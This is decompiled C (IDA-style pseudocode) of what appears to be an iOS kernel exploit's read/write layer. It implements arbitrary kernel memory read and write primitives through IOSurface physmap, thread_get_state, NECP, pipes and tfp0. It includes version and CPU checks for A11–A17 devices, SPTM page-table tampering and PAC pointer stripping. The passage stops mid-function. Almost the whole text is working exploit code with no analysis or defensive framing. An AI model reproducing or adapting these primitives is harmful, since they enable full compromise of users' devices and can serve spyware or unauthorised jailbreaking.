//----- (0000000000028CE0) ----------------------------------------------------
unsigned __int64 __fastcall find_sptm_pgtable_state_block(struct_krwCtx *krwCtx, unsigned __int64 a2, __int64 a3)
{
  int v5; // w0
  struct
  {
    __int128 v7[2];
    __int64 v8;
  } out; // [xsp+0h] [xbp-50h] BYREF

  memset(&out, 0, sizeof(out));
  v5 = pgtable_walk_full(krwCtx, a2, (__int64)&out, a3).n128_u64[0];
  if ( v5 )
    return (krwCtx->pageMask & a2) | (out.v8 & 0xFFFFFFFFC000LL);
  else
    return 0;
}

//----- (0000000000028D44) ----------------------------------------------------
__int64 __fastcall teardown_sptm_pgtable_state(__int64 a1)
{
  __int64 v1; // x21
  uint64_t *v2; // x19
  vm_address_t v4; // x1
  vm_size_t v5; // x2

  v1 = 708609;
  v2 = *(uint64_t **)(a1 + 7496);
  if ( v2 )
  {
    v4 = v2[2];
    if ( !v4
      || (v5 = v2[3]) == 0
      || (vm_deallocate(mach_task_self_, v4, v5), v2[2] = 0, v2[3] = 0, (v2 = *(uint64_t **)(a1 + 7496)) != 0) )
    {
      *(uint64_t *)(a1 + 7496) = 0;
      *((uint8_t *)v2 + 72) = 1;
      __ulock_wake(0x201u, (void *)((char *)v2 + 52), *((unsigned int *)v2 + 12));
      pthread_join((pthread_t)v2[5], 0);
      *(__int128 *)v2 = 0u;
      *((__int128 *)v2 + 1) = 0u;
      *((__int128 *)v2 + 2) = 0u;
      *((__int128 *)v2 + 3) = 0u;
      *((__int128 *)v2 + 4) = 0u;
      *((__int128 *)v2 + 5) = 0u;
      *((__int128 *)v2 + 6) = 0u;
      v2[14] = 0;
      free(v2);
      return 0;
    }
  }
  return v1;
}

//----- (0000000000028DFC) ----------------------------------------------------
bool __fastcall noppl_kwrite32(struct_krwCtx *krwCtx, mach_vm_address_t address, int a3)
{
  // struct_krwCtx *krwCtx; // x19
  __int64 (__fastcall *v5)(__int64, mach_vm_address_t, int *, __int64, __int64); // x8
  int v6; // w0
  kern_return_t v7; // w21
  vm_map_t v9; // w0
  int v10; // [xsp+8h] [xbp-28h] BYREF
  vm_machine_attribute_val_t value; // [xsp+Ch] [xbp-24h] BYREF

  v10 = a3;
  v5 = (__int64 (__fastcall *)(__int64, mach_vm_address_t, int *, __int64, __int64))krwCtx->iogpuKwriteFn;
  if ( v5 )
  {
    v6 = v5(krwCtx, address, &v10, 4, 1);
    goto LABEL_3;
  }
  if ( (unsigned int)(krwCtx->threadForKernelRead + 1) >= 2 && krwCtx->threadStateKrwPhysAddr )
  {
    v6 = iosurface_physmap_kwrite(krwCtx, address, (__int64)&v10, 4u, 1);
  }
  else if ( (unsigned int)(krwCtx->ioConnectPort + 1) >= 2 && krwCtx->ioConnectMappedAddr && krwCtx->ioConnectMappedSize )
  {
    v6 = ioconnect_callmethod_write(krwCtx, address, (__int64)&v10, 4u, 1);
  }
  else
  {
    if ( krwCtx->krw_pipe_0 == -1 || krwCtx->krw_pipe_1 == -1 )
      goto LABEL_22;
    if ( krwCtx->iosurfaceFd_size4 != -1 && krwCtx->gap_0x218 )
    {
      v6 = necp_ioconnect_krw(krwCtx, address, (__int64)&v10, 4u, 1);
      goto LABEL_3;
    }
    if ( krwCtx->pipeFd0 == -1 || krwCtx->pipeFd1 == -1 )
    {
LABEL_22:
      v7 = mach_vm_write(krwCtx->targetVmPort, address, (vm_offset_t)&v10, 4u);
      v9 = krwCtx->targetVmPort;
      value = 7;
      mach_vm_machine_attribute(v9, address, 4u, 1u, &value);
      return v7 == 0;
    }
    v6 = pipe_pair_krw(krwCtx, address, &v10, 4u, 1);
  }
LABEL_3:
  if ( v6 )
    v7 = 5;
  else
    v7 = 0;
  return v7 == 0;
}

//----- (0000000000028F90) ----------------------------------------------------
__int64 __fastcall iosurface_physmap_kwrite(struct_krwCtx *krwCtx, unsigned __int64 a2, __int64 a3, unsigned int a4, int a5)
{
  __int64 v5; // x25
  uint64_t IOKitConnInfo; // x8
  unsigned int v8; // w26
  unsigned int v12; // w24
  __int64 v13; // x8
  __int64 v14; // x21
  unsigned __int64 v15; // x23
  __int64 v16; // x0
  size_t v17; // x2
  __int64 v18; // x25
  unsigned int v19; // w28
  unsigned __int64 v20; // x19
  unsigned __int64 v21; // x8
  __int64 v22; // x20
  unsigned int v23; // w21
  unsigned __int64 v24; // x24
  __int64 v25; // x0
  size_t v26; // x2
  int v27; // w19
  int v28; // w23
  vm_size_t v29; // x20
  __int64 v30; // x21
  uint64_t v31; // x26
  int v32; // w9
  __int64 v33; // x8
  __int64 v34; // x9
  __int64 v35; // x19
  __int64 *v36; // x27
  int v37; // w20
  unsigned __int64 v38; // x1
  __int64 v39; // x0
  __int64 paddr; // x0
  __int64 v41; // x19
  vm_address_t v42; // x8
  int v43; // w9
  bool v44; // zf
  __int64 v45; // x0
  __int64 v46; // x0
  int v47; // w8
  __int64 v48; // x19
  int v49; // w8
  unsigned int v50; // w8
  unsigned int v51; // w20
  __int64 v52; // x0
  __int64 v53; // x0
  int v54; // w0
  vm_size_t v56; // [xsp+8h] [xbp-B8h]
  unsigned __int64 v57; // [xsp+10h] [xbp-B0h]
  __int64 v58; // [xsp+18h] [xbp-A8h]
  unsigned int v59; // [xsp+24h] [xbp-9Ch]
  unsigned __int64 v60; // [xsp+28h] [xbp-98h]
  unsigned __int64 v61; // [xsp+30h] [xbp-90h]
  unsigned int v62; // [xsp+38h] [xbp-88h]
  int v63; // [xsp+40h] [xbp-80h] BYREF
  int v64; // [xsp+44h] [xbp-7Ch] BYREF
  int v65; // [xsp+48h] [xbp-78h] BYREF
  int v66; // [xsp+4Ch] [xbp-74h] BYREF
  unsigned __int64 v67; // [xsp+50h] [xbp-70h] BYREF
  __int64 v68; // [xsp+58h] [xbp-68h] BYREF
  vm_address_t address; // [xsp+60h] [xbp-60h] BYREF
  unsigned __int64 v70; // [xsp+68h] [xbp-58h] BYREF

  v5 = 708609;
  IOKitConnInfo = krwCtx->IOKitConnInfo;
  if ( !IOKitConnInfo )
  {
    TRACE_PORTS("iosurface_physmap_kwrite no state ctx=%llx addr=%llx size=%u\n",
                (unsigned long long)a1,
                (unsigned long long)a2,
                a4);
    return v5;
  }
  TRACE_PORTS("iosurface_physmap_kwrite enter ctx=%llx addr=%llx buf=%llx size=%u a5=%d state=%llx flags=%x byte4a=%u thread=%d ptr=%llx\n",
              (unsigned long long)krwCtx,
              (unsigned long long)a2,
              (unsigned long long)a3,
              a4,
              a5,
              (unsigned long long)IOKitConnInfo,
              krwCtx->flags,
              *(unsigned __int8 *)(IOKitConnInfo + 74),
              krwCtx->threadForKernelRead,
              (unsigned long long)*(uint64_t *)&krwCtx->threadStateKrwPhysAddr);
  v8 = a4;
  if ( ((a2 & 3) != 0 || a4 != 4) && *(uint8_t *)(IOKitConnInfo + 74) )
  {
    if ( krwCtx->threadForKernelRead + 1 >= 2 )
    {
      if ( *(uint64_t *)&krwCtx->threadStateKrwPhysAddr )
      {
        if ( check_kaddr_in_physmap(krwCtx, a2) )
        {
          LODWORD(address) = -1;
          if ( !a5 || (v5 = fd_open_dev_null((int *)&address), !(uint32_t)v5) )
          {
            if ( v8 )
            {
              v12 = 0;
              while ( 1 )
              {
                v70 = 0;
                v13 = a2 + v12;
                v14 = v13 & 7;
                v15 = v13 - v14;
                v16 = kreadbuf_via_dev_null_and_thread_state(krwCtx, v13 - v14, (__int64)&v70, 8u, 0);
                if ( (uint32_t)v16 )
                {
                  TRACE_PORTS("iosurface_physmap_kwrite unaligned read failed raw=%x aligned=%llx off=%llx\n",
                              (unsigned int)v16,
                              (unsigned long long)v15,
                              (unsigned long long)v14);
                  break;
                }
                v17 = 8 - v14 >= (unsigned __int64)(v8 - v12) ? v8 - v12 : 8 - v14;
                v18 = v70;
                memcpy((void *)((unsigned __int64)&v70 | v14), (const void *)(a3 + v12), v17);
                if ( v18 != v70 )
                {
                  v16 = ioconnect_struct_method_kwrite(krwCtx, v15, v70);
                  if ( (uint32_t)v16 )
                  {
                    TRACE_PORTS("iosurface_physmap_kwrite unaligned write failed raw=%x aligned=%llx value=%llx\n",
                                (unsigned int)v16,
                                (unsigned long long)v15,
                                (unsigned long long)v70);
                    break;
                  }
                }
                v12 = v12 - v14 + 8;
                if ( v12 >= v8 )
                  goto LABEL_19;
              }
              v5 = v16;
            }
            else
            {
LABEL_19:
              v5 = 0;
            }
            v54 = address;
            goto LABEL_100;
          }
        }
      }
    }
    return v5;
  }
  if ( !check_kaddr_in_physmap(krwCtx, a2) )
  {
    TRACE_PORTS("iosurface_physmap_kwrite validate failed addr=%llx\n", (unsigned long long)a2);
    return v5;
  }
  v64 = -1;
  if ( a5 )
  {
    v5 = fd_open_dev_null(&v64);
    if ( (uint32_t)v5 )
      return v5;
  }
  if ( !v8 )
    goto LABEL_97;
  v61 = a2;
  v19 = 0;
  v59 = v8;
  v58 = a3;
LABEL_25:
  v20 = v8 - v19;
  v63 = 0;
  v21 = v61 + v19;
  if ( (unsigned int)v20 >= 4 )
  {
    v23 = 0;
    v22 = v19;
  }
  else
  {
    v22 = v19;
    if ( (((v21 + (unsigned int)v20 - 1) ^ (v21 + 3)) & ~krwCtx->pageMask) != 0 )
      v23 = 4 - v20;
    else
      v23 = 0;
  }
  v24 = v21 - v23;
  v25 = kreadbuf_via_dev_null_and_thread_state(krwCtx, v24, (__int64)&v63, 4u, 0);
  if ( !(uint32_t)v25 )
  {
    if ( 4 - (unsigned __int64)v23 >= v20 )
      v26 = v8 - v19;
    else
      v26 = 4LL - v23;
    v27 = v63;
    memcpy((char *)&v63 + v23, (const void *)(a3 + v22), v26);
    v28 = v63;
    v62 = v23;
    if ( v27 == v63 )
      goto LABEL_72;
    TRACE_PORTS("iosurface_physmap_kwrite aligned chunk addr=%llx base=%llx old=%x new=%x off=%u left=%llu\n",
                (unsigned long long)v21,
                (unsigned long long)v24,
                v27,
                v63,
                v23,
                (unsigned long long)v20);
    v70 = v24;
    address = 0;
    v29 = vm_page_size;
    if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A17) )
    {
      v30 = 224;
    }
    else if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A11_TO_A17_OR_SELF_TASK_PORT_MASK) )
    {
      v30 = 144;
    }
    else
    {
      v30 = 216;
    }
    v31 = krwCtx->IOKitConnInfo;
    v5 = 708609;
    if ( !v31 )
    {
      TRACE_PORTS("iosurface_physmap_kwrite missing IOKitConnInfo during chunk\n");
      goto LABEL_66;
    }
    v32 = *(uint32_t *)(v31 + 56);
    v5 = 708609;
    if ( !v32 )
    {
      TRACE_PORTS("iosurface_physmap_kwrite missing state[56]\n");
      goto LABEL_66;
    }
    v33 = *(uint64_t *)(v31 + 8);
    v5 = 708609;
    if ( !v33 )
    {
      TRACE_PORTS("iosurface_physmap_kwrite missing state[8]\n");
      goto LABEL_66;
    }
    v34 = (unsigned int)(v32 + 96);
    v35 = *(uint64_t *)(v31 + 32);
    v60 = v33 + v34;
    v56 = v29;
    v57 = v33 + v30;
    v36 = (__int64 *)(v35 + v34);
    v37 = 11;
    while ( 1 )
    {
      if ( v37 != 11 )
        thread_switch(*(uint32_t *)(v31 + 48), 2, 0xAu);
      if ( krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(10002, 60, 75, 0, 2) && (krwCtx->flags & KRW_CTX_FLAG_PAC_KERNEL_LAYOUT) != 0 )
      {
        v68 = 0;
        v39 = read_via_mapped_physmem_region(krwCtx, v60, &v68, krwCtx->stride_0x168, 0);
        if ( (uint32_t)v39 )
          goto LABEL_64;
        if ( !validate_kaddr_range(krwCtx, v68) )
          goto LABEL_55;
        v67 = 0;
        v39 = read_via_mapped_physmem_region(krwCtx, v57, &v67, krwCtx->stride_0x168, 0);
        if ( (uint32_t)v39 )
        {
LABEL_64:
          v5 = v39;
          goto LABEL_65;
        }
        v38 = v67;
      }
      else
      {
        v68 = *v36;
        if ( !validate_kaddr_range(krwCtx, v68) )
          goto LABEL_55;
        v38 = *(uint64_t *)(v35 + v30);
        v67 = v38;
      }
      if ( v38 == v68 )
      {
        paddr = find_sptm_pgtable_state_block(krwCtx, v38, 0);
        v29 = v56;
        if ( !paddr )
        {
          v5 = 163878;
          goto LABEL_66;
        }
        v41 = paddr;
        if ( krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(10002, 60, 75, 0, 2) && (krwCtx->flags & KRW_CTX_FLAG_PAC_KERNEL_LAYOUT) != 0 )
        {
          v45 = read_via_mapped_physmem_region(krwCtx, paddr + 52, &v65, 4u, 0);
          v5 = v45;
          if ( (uint32_t)v45 )
            goto LABEL_66;
          v5 = 163857;
          if ( v65 != 1 )
            goto LABEL_66;
          if ( v28 )
          {
            v65 = v28 + 1;
            v46 = physwritebuf_direct_mapped(krwCtx, v41 + 52, &v65, 4u, 0);
            v5 = v46;
            if ( (uint32_t)v46 )
              goto LABEL_66;
            v47 = 1;
          }
          else
          {
            v47 = 2;
          }
          v66 = v47;
          v52 = physwritebuf_direct_mapped(krwCtx, v41 + 56, &v66, 4u, 0);
          v5 = v52;
          if ( !(uint32_t)v52 )
          {
            v53 = physwritebuf_direct_mapped(krwCtx, v60 + 24, &v70, krwCtx->stride_0x168, 0);
            v5 = v53;
            if ( !(uint32_t)v53 )
            {
LABEL_82:
              v48 = *(uint64_t *)(v31 + 64);
              if ( (unsigned int)__ulock_wake(0x201u, (void *)(v31 + 52), *(unsigned int *)(v31 + 48)) )
              {
                v49 = errno;
                if ( v49 < 0 )
                  v49 = -v49;
                v5 = v49 | 0x40000000u;
              }
              else if ( v48 == *(uint64_t *)(v31 + 64) )
              {
                v50 = 0;
                while ( v50 != 1001 )
                {
                  v51 = v50 + 1;
                  thread_switch(*(uint32_t *)(v31 + 48), 2, v50 > 8);
                  v5 = 0;
                  v50 = v51;
                  v29 = v56;
                  if ( v48 != *(uint64_t *)(v31 + 64) )
                    goto LABEL_66;
                }
                v5 = 4097;
              }
              else
              {
                v5 = 0;
              }
            }
          }
        }
        else
        {
          v5 = physmap_maybe(krwCtx, &address, v56, paddr);
          if ( !(uint32_t)v5 )
          {
            v42 = (krwCtx->pageMask & v68) + address;
            v65 = *(uint32_t *)(v42 + 52);
            v5 = 163857;
            if ( v65 == 1 )
            {
              if ( v28 )
              {
                *(uint32_t *)(v42 + 52) = v28 + 1;
                v43 = 1;
              }
              else
              {
                v43 = 2;
              }
              v66 = v43;
              *(uint32_t *)(v42 + 56) = v43;
              v36[3] = v24;
              goto LABEL_82;
            }
          }
        }
LABEL_66:
        TRACE_PORTS("iosurface_physmap_kwrite chunk cleanup err=%llx addr=%llx physmap=%llx\n",
                    (unsigned long long)v5,
                    (unsigned long long)v24,
                    (unsigned long long)address);
        if ( address )
          v44 = v29 == 0;
        else
          v44 = 1;
        if ( !v44 )
          vm_deallocate(mach_task_self_, address, v29);
        v8 = v59;
        a3 = v58;
        if ( (uint32_t)v5 )
          goto LABEL_99;
LABEL_72:
        v19 = v19 - v62 + 4;
        if ( v19 >= v8 )
        {
LABEL_97:
          v5 = 0;
          goto LABEL_99;
        }
        goto LABEL_25;
      }
LABEL_55:
      if ( !--v37 )
      {
        v5 = 163878;
LABEL_65:
        v29 = v56;
        goto LABEL_66;
      }
    }
  }
  v5 = v25;
  TRACE_PORTS("iosurface_physmap_kwrite pre-read failed raw=%llx addr=%llx base=%llx\n",
              (unsigned long long)v5,
              (unsigned long long)v21,
              (unsigned long long)v24);
LABEL_99:
  v54 = v64;
LABEL_100:
  if ( v54 != -1 )
    fd_close(v54);
  TRACE_PORTS("iosurface_physmap_kwrite exit raw=%llx\n", (unsigned long long)v5);
  return v5;
}
// 292C0: variable 'v39' is possibly undefined
// 2942C: variable 'v45' is possibly undefined
// 2946C: variable 'v46' is possibly undefined
// 29530: variable 'v52' is possibly undefined
// 29554: variable 'v53' is possibly undefined

//----- (00000000000295B4) ----------------------------------------------------
bool __fastcall kread_u32(struct_krwCtx *krwCtx, unsigned __int64 vaddr, void *outBuf)
{
  // struct_krwCtx *krwCtx; // x19
  __int64 (__fastcall *v3)(__int64, unsigned __int64, void *, unsigned int, __int64); // x8
  int v4; // w0
  int v5; // w0
  __int64 v7; // [xsp+8h] [xbp-8h] BYREF

  krwCtx = KRWCTX_FROM_UINTPTR(krwCtx);
  v3 = (__int64 (__fastcall *)(__int64, unsigned __int64, void *, unsigned int, __int64))krwCtx->iogpuKreadFn;
  if ( v3 )
  {
    v4 = v3(krwCtx, vaddr, outBuf, 4, 1);
    goto LABEL_3;
  }
  if ( (unsigned int)(krwCtx->threadForKernelRead + 1) >= 2 && krwCtx->threadStateKrwPhysAddr )
  {
    v4 = kreadbuf_via_dev_null_and_thread_state(krwCtx, vaddr, (__int64)outBuf, 4u, 1);
  }
  else if ( (unsigned int)(krwCtx->ioConnectPort + 1) >= 2 && krwCtx->ioConnectMappedAddr && krwCtx->ioConnectMappedSize )
  {
    v4 = kreadbuf_via_IOConnectCallMethod(krwCtx, vaddr, (__int64)outBuf, 4u, 1);
  }
  else
  {
    if ( krwCtx->krw_pipe_0 == -1 || krwCtx->krw_pipe_1 == -1 )
      goto LABEL_22;
    if ( krwCtx->iosurfaceFd != -1 && krwCtx->gap_0x218 )
    {
      v4 = kreadbuf_via_dev_null_only(krwCtx, vaddr, (__int64)outBuf, 4u, 1);
      goto LABEL_3;
    }
    if ( krwCtx->pipeFd0 == -1 || krwCtx->pipeFd1 == -1 )
    {
LABEL_22:
      v5 = kreadbuf_via_tfp0(
             krwCtx->targetVmPort,
             vaddr,
             4u,
             krwCtx->vmMapSize,
             (__int64)outBuf,
             &v7);
      return v5 == 0;
    }
    v4 = kreadbuf_via_dev_null_simple(krwCtx, vaddr, outBuf, 4u, 1);
  }
LABEL_3:
  if ( v4 )
    v5 = 5;
  else
    v5 = 0;
  return v5 == 0;
}

//----- (00000000000296E8) ----------------------------------------------------
__int64 __fastcall kreadbuf_via_dev_null_and_thread_state(
        struct_krwCtx *krwCtx,
        unsigned __int64 vaddr,
        __int64 outBuf,
        unsigned int size,
        int a5)
{
  __int64 v5; // x28
  unsigned __int64 vaddr_; // x22
  unsigned int iMaybe; // w8
  unsigned __int32 sizeMinusI; // w19
  __int64 iPtr; // x26
  unsigned __int64 xnuVersionPacked; // x8
  int v16; // w9
  unsigned __int32 v17; // w8
  unsigned __int32 v18[2]; // x24
  unsigned __int64 v19; // x20
  __int64 v20; // x8
  size_t offIGuess; // x26
  unsigned __int64 v22; // x21
  void *outBufWithOffAndOff; // x27
  unsigned __int64 v24; // x22
  uint64_t v25; // x8
  __int64 v26; // x9
  unsigned __int64 v27; // x8
  unsigned __int64 v28; // x19
  __int64 v29; // x25
  kern_return_t v30; // w0
  uint64_t pageMask; // x25
  __int64 v32; // x19
  __int64 v33; // x25
  __int64 v34; // x0
  kern_return_t state; // w0
  unsigned int v36; // w19
  __int64 v37; // x0
  unsigned int v38; // w0
  unsigned int v39; // w8
  unsigned __int64 vaddr__; // [xsp+8h] [xbp-2B8h]
  __int64 outBuf_; // [xsp+10h] [xbp-2B0h]
  unsigned int size_; // [xsp+1Ch] [xbp-2A4h]
  int v43; // [xsp+20h] [xbp-2A0h]
  __int64 outBufWithOff; // [xsp+28h] [xbp-298h]
  __int64 vaddrPlusI; // [xsp+30h] [xbp-290h]
  int fd; // [xsp+38h] [xbp-288h] BYREF
  mach_msg_type_number_t v47; // [xsp+3Ch] [xbp-284h] BYREF
  natural_t old_state[134]; // [xsp+40h] [xbp-280h] BYREF
  __int64 v49; // [xsp+258h] [xbp-68h] BYREF
  mach_msg_type_number_t old_stateCnt[4]; // [xsp+260h] [xbp-60h] BYREF

  v5 = 0xAD001;
  if ( krwCtx->threadForKernelRead + 1 >= 2 )
  {
    if ( *(uint64_t *)&krwCtx->threadStateKrwPhysAddr )
    {
      vaddr_ = vaddr;
      if ( check_kaddr_in_physmap(krwCtx, vaddr) )
      {
        fd = -1;
        if ( !a5 || (v5 = fd_open_dev_null(&fd), !(uint32_t)v5) )
        {
          if ( size )
          {
            iMaybe = 0;
            size_ = size;
            vaddr__ = vaddr_;
            outBuf_ = outBuf;
            while ( 1 )
            {
              sizeMinusI = size - iMaybe;
              iPtr = iMaybe;
              vaddrPlusI = vaddr_ + iMaybe;
              if ( (krwCtx->pageMask & vaddrPlusI) == 0 && sizeMinusI >= 0x4000 && krw_ctx_has_read_caps(krwCtx) )
              {
                xnuVersionPacked = krwCtx->xnuVersionPacked;
                if ( xnuVersionPacked <= XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) )
                  v16 = 0x4000;
                else
                  v16 = 0x80000;
                if ( xnuVersionPacked <= XNU_VERSION_PACKED(10001, 1023, 1023, 1023, 1023) )
                  v17 = v16;
                else
                  v17 = 528;
                if ( sizeMinusI >= v17 )
                  v18[0] = v17;
                else
                  v18[0] = sizeMinusI;
                v5 = necp_semaphore_kread(krwCtx, vaddrPlusI, (char *)(outBuf + iPtr), v18[0]);
LABEL_68:
                if ( (uint32_t)v5 )
                  goto LABEL_72;
                goto LABEL_69;
              }
              if ( sizeMinusI >= 0x210 )
                *(uint64_t *)v18 = 528;
              else
                *(uint64_t *)v18 = sizeMinusI;
              if ( krwCtx->threadForKernelRead + 1 < 2 || !*(uint64_t *)&krwCtx->threadStateKrwPhysAddr )
              {
                v5 = 708609;
                goto LABEL_72;
              }
              if ( v18[0] )
                break;
LABEL_69:
              iMaybe = v18[0] + iPtr;
              if ( v18[0] + (unsigned int)iPtr >= size )
                goto LABEL_70;
            }
            v19 = 0;
            v20 = iPtr;
            offIGuess = 0;
            v43 = v20;
            outBufWithOff = outBuf + v20;
            while ( 1 )
            {
              v22 = v19 + vaddrPlusI;
              outBufWithOffAndOff = (void *)(v19 + outBufWithOff);
              v24 = *(uint64_t *)v18 - v19;
              if ( krwCtx->xnuVersionPacked >= XNU_VERSION_PACKED(10002, 60, 75, 0, 3) && (krwCtx->flags & KRW_CTX_FLAG_PAC_KERNEL_LAYOUT) != 0 )
              {
                *(uint64_t *)old_stateCnt = 0;
                v47 = 132;
                pageMask = krwCtx->pageMask;
                if ( (pageMask & v22) >= (unsigned __int64)(unsigned int)krwCtx->pageSizeOrSomething - 528 )
                  v32 = (unsigned int)krwCtx->pageSizeOrSomething - 528LL;
                else
                  v32 = pageMask & v22;
                if ( validate_kaddr_range(krwCtx, *(uint64_t *)&krwCtx->threadStateSavedPtr) )
                {
                  *(uint64_t *)old_stateCnt = *(uint64_t *)&krwCtx->threadStateSavedPtr;
                  goto LABEL_45;
                }
                v37 = read_via_mapped_physmem_region(krwCtx, *(uint64_t *)&krwCtx->threadStateKrwPhysAddr, old_stateCnt, 8u, 0);
                v5 = v37;
                if ( !(uint32_t)v37 )
                {
                  *(uint64_t *)&krwCtx->threadStateSavedPtr = *(uint64_t *)old_stateCnt;
LABEL_45:
                  v33 = v32 + (v22 & ~pageMask);
                  __dsb(0xBu);
                  v49 = v33 - 16;
                  v34 = physwritebuf_direct_mapped(krwCtx, *(uint64_t *)&krwCtx->threadStateKrwPhysAddr, &v49, 8u, 0);
                  v5 = v34;
                  if ( !(uint32_t)v34 )
                  {
                    state = thread_get_state(krwCtx->threadForKernelRead, 0x11, old_state, &v47);
                    if ( state )
                    {
                      v36 = state | 0x80000000;
                    }
                    else if ( v47 == 132 )
                    {
                      if ( v33 - v22 + 528 <= v24 )
                        offIGuess = v33 - v22 + 528;
                      else
                        offIGuess = *(uint64_t *)v18 - v19;
                      memcpy(outBufWithOffAndOff, (char *)old_state + v22 - v33, offIGuess);
                      v36 = 0;
                    }
                    else
                    {
                      v36 = 708642;
                    }
                    v38 = physwritebuf_direct_mapped(krwCtx, *(uint64_t *)&krwCtx->threadStateKrwPhysAddr, old_stateCnt, 8u, 0);
                    if ( v36 )
                      v39 = v36;
                    else
                      v39 = v38;
                    if ( v38 )
                      v5 = v39;
                    else
                      v5 = v36;
                  }
                }
              }
              else
              {
                old_stateCnt[0] = 132;
                v25 = krwCtx->pageMask;
                v26 = v22 & ~v25;
                v27 = v25 & v22;
                if ( v27 >= (unsigned __int64)(unsigned int)krwCtx->pageSizeOrSomething - 528 )
                  v27 = (unsigned int)krwCtx->pageSizeOrSomething - 528LL;
                v28 = v27 + v26;
                v29 = **(uint64_t **)&krwCtx->threadStateMappedPtr;
                __dsb(0xBu);
                **(uint64_t **)&krwCtx->threadStateMappedPtr = v27 + v26 - 16;
                v30 = thread_get_state(krwCtx->threadForKernelRead, 17, old_state, old_stateCnt);
                if ( v30 )
                {
                  v5 = v30 | 0x80000000;
                }
                else if ( old_stateCnt[0] == 132 )
                {
                  if ( v28 - v22 + 528 <= v24 )
                    offIGuess = v28 - v22 + 528;
                  else
                    offIGuess = *(uint64_t *)v18 - v19;
                  memcpy(outBufWithOffAndOff, (char *)old_state + v22 - v28, offIGuess);
                  v5 = 0;
                }
                else
                {
                  v5 = 708642;
                }
                **(uint64_t **)&krwCtx->threadStateMappedPtr = v29;
              }
              if ( !(uint32_t)v5 )
              {
                v19 += offIGuess;
                if ( v19 < *(uint64_t *)v18 )
                  continue;
              }
              size = size_;
              vaddr_ = vaddr__;
              outBuf = outBuf_;
              LODWORD(iPtr) = v43;
              goto LABEL_68;
            }
          }
LABEL_70:
          v5 = 0;
LABEL_72:
          if ( fd != -1 )
            fd_close(fd);
        }
      }
    }
  }
  return v5;
}
// 2999C: variable 'v34' is possibly undefined
// 29A04: variable 'v37' is possibly undefined
// 29A7C: variable 'v38' is possibly undefined

//----- (0000000000029AD0) ----------------------------------------------------
__int64 __fastcall kreadbuf_via_tfp0(
        vm_map_read_t target_task,
        __int64 vaddr,
        mach_vm_size_t size,
        mach_vm_size_t size2,
        __int64 outBuf,
        uint64_t *a6)
{
  mach_vm_size_t v8; // x21
  __int64 baseAddr; // x24
  mach_vm_size_t v12; // x25
  mach_vm_size_t v13; // x2
  __int64 result; // x0
  mach_vm_size_t outsize; // [xsp+8h] [xbp-48h] BYREF

  if ( !size )
    return 4;
  v8 = size;
  baseAddr = 0;
  if ( size2 )
    v12 = size2;
  else
    v12 = size;
  while ( 1 )
  {
    outsize = v8;
    v13 = v8 >= v12 ? v12 : v8;
    result = mach_vm_read_overwrite(target_task, baseAddr + vaddr, v13, baseAddr + outBuf, &outsize);
    if ( (uint32_t)result )
      break;
    baseAddr = (unsigned int)(outsize + baseAddr);
    v8 -= outsize;
    if ( !v8 )
    {
      result = 0;
      if ( a6 )
        *a6 = baseAddr;
      return result;
    }
  }
  return result;
}

//----- (0000000000029B78) ----------------------------------------------------
bool __fastcall kread64_internal(struct_krwCtx *krwCtx, unsigned __int64 a2, uint64_t *a3)
{
  __int64 (__fastcall *v3)(struct_krwCtx *, unsigned __int64, uint64_t *, uint64_t, __int64); // x8
  int v4; // w0
  int v5; // w0
  __int64 v7; // [xsp+8h] [xbp-8h] BYREF

  *a3 = 0;
  v3 = *(__int64 (__fastcall **)(struct_krwCtx *, unsigned __int64, uint64_t *, uint64_t, __int64))&krwCtx->iogpuKreadFn;
  if ( v3 )
  {
    v4 = v3(krwCtx, a2, a3, (unsigned int)krwCtx->stride_0x168, 1);
    goto LABEL_3;
  }
  if ( krwCtx->threadForKernelRead + 1 >= 2 && *(uint64_t *)&krwCtx->threadStateKrwPhysAddr )
  {
    v4 = kreadbuf_via_dev_null_and_thread_state(krwCtx, a2, (__int64)a3, krwCtx->stride_0x168, 1);
  }
  else if ( (unsigned int)(*(uint32_t *)&krwCtx->ioConnectPort + 1) >= 2 && *(uint64_t *)&krwCtx->ioConnectMappedAddr && *(uint64_t *)&krwCtx->ioConnectMappedSize )
  {
    v4 = kreadbuf_via_IOConnectCallMethod(krwCtx, a2, (__int64)a3, krwCtx->stride_0x168, 1);
  }
  else
  {
    if ( krwCtx->krw_pipe_0 == -1 || krwCtx->krw_pipe_1 == -1 )
      goto LABEL_22;
    if ( krwCtx->iosurfaceFd != -1 && krwCtx->gap_0x218 )
    {
      v4 = kreadbuf_via_dev_null_only(krwCtx, a2, (__int64)a3, krwCtx->stride_0x168, 1);
      goto LABEL_3;
    }
    if ( krwCtx->pipeFd0 == -1 || krwCtx->pipeFd1 == -1 )
    {
LABEL_22:
      v5 = kreadbuf_via_tfp0(krwCtx->targetAndParentTaskPorts, a2, krwCtx->stride_0x168, (unsigned int)krwCtx->vmMapSize, (__int64)a3, &v7);
      return v5 == 0;
    }
    v4 = kreadbuf_via_dev_null_simple(krwCtx, a2, a3, krwCtx->stride_0x168, 1);
  }
LABEL_3:
  if ( v4 )
    v5 = 5;
  else
    v5 = 0;
  return v5 == 0;
}

//----- (0000000000029CB0) ----------------------------------------------------
unsigned __int64 __fastcall maybe_sptm_translate_kaddr(struct_krwCtx *krwCtx, __int64 a2)
{

  if ( !krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK) || (krwCtx->flags & KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK) == 0 )
    return a2;
  return krw_xpac_vaddr(krwCtx, a2);
}
// 29D08: variable 'vars8' is possibly undefined

//----- (0000000000029D2C) ----------------------------------------------------
unsigned __int64 __fastcall krw_xpac_vaddr_if_needed(struct_krwCtx *krwCtx, __int64 a2)
{

  if ( !krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK) )
    return a2;
  return krw_xpac_vaddr(krwCtx, a2);
}
// 29D68: variable 'vars8' is possibly undefined

//----- (0000000000029D88) ----------------------------------------------------
unsigned __int64 __fastcall krw_xpac_vaddr(struct_krwCtx *krwCtx, __int64 a2)
{
  __int64 v2; // x19

  v2 = a2;
  if ( a2 && (a2 & 0x80000000000000LL) != 0 )
  {
